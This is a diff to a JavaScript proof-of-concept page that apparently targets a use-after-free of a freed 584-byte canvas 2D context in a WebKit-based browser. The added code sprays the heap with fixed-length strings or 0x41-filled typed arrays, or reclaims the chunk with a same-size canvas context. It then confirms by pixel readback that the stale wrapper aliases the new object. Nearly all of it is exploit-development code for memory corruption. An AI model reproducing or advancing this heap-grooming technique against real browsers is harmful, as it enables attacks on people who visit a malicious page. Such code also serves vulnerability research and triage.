@@ -41,6 +41,7 @@
 const qs = new URLSearchParams(location.search);
 const LEN = Number(qs.get("len") || 567);      // 584 - sizeof(StringImpl) - 1
 const COUNT = Number(qs.get("count") || 256);
+const MODE = qs.get("mode") || "string";   // "string" | "bytes" | "canvas"
 
 function log(m) {
   document.title = m;
@@ -77,12 +78,40 @@ let stale = innerCtx;
 // Nothing that touches the DOM between here and the end of the spray.
 // ---------------------------------------------------------------------------
 let spray = [];
-if (stale) {
-  let body = "";
-  for (let i = 0; i < LEN - 1; ++i)
-    body += "A";
-  for (let i = 0; i < COUNT; ++i)
-    spray.push(body + (i % 10));   // constant length, all-0x41 bodies
+let alias = null;
+if (stale && MODE === "canvas") {
+  // Same-type reuse: a second canvas of the same size allocates another
+  // CanvasRenderingContext2D of exactly the freed 584 bytes, which should
+  // land in the freed chunk.  If it does, the stale wrapper and ctx2 are the
+  // same object.
+  let canvas2 = document.createElement("canvas");
+  canvas2.width = 64;
+  canvas2.height = 64;
+  let ctx2 = canvas2.getContext("2d");
+  ctx2.fillStyle = "#000";
+  ctx2.fillRect(0, 0, 64, 64);
+  stale.fillStyle = "#ff0000";            // writes through the live object
+  stale.fillRect(0, 0, 64, 64);
+  let px = ctx2.getImageData(4, 4, 1, 1).data;
+  alias = "canvas2 pixel after stale.fillRect = " + px[0] + "," + px[1] + "," + px[2] +
+          " (255,0,0 means the stale wrapper IS ctx2)";
+  window.__canvas2 = canvas2;
+  window.__ctx2 = ctx2;
+} else if (stale) {
+  if (MODE === "bytes") {
+    // A typed-array backing store has no header at all: every one of its LEN
+    // bytes is page-chosen.  With USE_SYSTEM_MALLOC=ON (gigacage disabled)
+    // array buffers come from the ordinary allocator, so this is a candidate
+    // for the freed fastMalloc chunk.
+    for (let i = 0; i < COUNT; ++i)
+      spray.push(new Uint8Array(LEN).fill(0x41));
+  } else {
+    let body = "";
+    for (let i = 0; i < LEN - 1; ++i)
+      body += "A";
+    for (let i = 0; i < COUNT; ++i)
+      spray.push(body + (i % 10));   // constant length, all-0x41 bodies
+  }
   window.__spray = spray;          // pin them against the GC
 }
 
@@ -94,13 +123,16 @@ if (!stale) {
   result = "outer=" + (outerCtx ? "a context" : "null") +
            " inner=" + (innerCtx ? "a context" : "null") +
            " same=" + (outerCtx === innerCtx) +
-           " sprayed=" + spray.length + " x " + LEN + " chars";
-  try {
-    stale.fillRect(0, 0, 8, 8);
-    result += " | stale.fillRect() returned without trapping";
-  } catch (e) {
-    result += " | stale.fillRect() threw: " + e;
-  }
+           " sprayed=" + spray.length + " x " + LEN + " " + MODE;
+  if (alias)
+    result += " | " + alias;
+  else
+    try {
+      stale.fillRect(0, 0, 8, 8);
+      result += " | stale.fillRect() returned without trapping";
+    } catch (e) {
+      result += " | stale.fillRect() threw: " + e;
+    }
   try {
     result += " | stale.canvas.width = " + stale.canvas.width;
   } catch (e) {
